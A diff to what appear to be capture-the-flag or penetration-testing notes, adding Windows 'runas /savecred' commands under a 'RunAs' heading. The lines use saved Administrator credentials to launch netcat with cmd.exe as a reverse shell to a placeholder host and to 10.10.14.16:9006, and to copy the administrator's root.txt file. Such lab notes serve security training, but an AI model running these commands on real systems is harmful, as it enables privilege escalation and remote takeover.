@@ -101,5 +101,7 @@ Two types:
 
 ## RunAs
 
-`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\Public\nc.exe`
-
+`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\Public\nc.exe -e cmd.exe x.x.x.x"`
+`runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.14.16 9006"`
+`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe x.x.x.x"`
+`C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\root.txt > C:\Users\security\root.txt"`
